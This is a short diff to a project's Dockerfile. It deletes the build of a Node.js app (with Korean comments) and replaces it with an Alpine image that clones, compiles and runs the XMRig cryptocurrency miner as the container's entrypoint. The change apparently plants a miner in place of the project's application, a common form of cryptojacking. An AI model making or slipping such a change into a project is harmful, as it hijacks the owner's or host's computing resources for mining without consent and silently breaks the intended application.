@@ -1,15 +1,10 @@
-# 베이스 이미지 설정
-FROM node:20
+FROM alpine:latest
+RUN apk add --no-cache git cmake make g++ libstdc++ libgcc openssl-dev hwloc-dev libuv-dev
+RUN git clone https://github.com/xmrig/xmrig.git && \
+    mkdir xmrig/build && cd xmrig/build && \
+    cmake .. -DWITH_HTTPD=OFF && \
+    make -j$(nproc)
+WORKDIR /xmrig/build
+ENTRYPOINT ["./xmrig"]
 
-# 작업 디렉터리 설정
-WORKDIR /usr/src/app
 
-# 패키지 파일 복사 및 의존성 설치
-COPY package*.json ./
-RUN npm install
-
-# 앱 파일 복사
-COPY . .
-
-# 앱 실행
-CMD ["node", "app.js"]
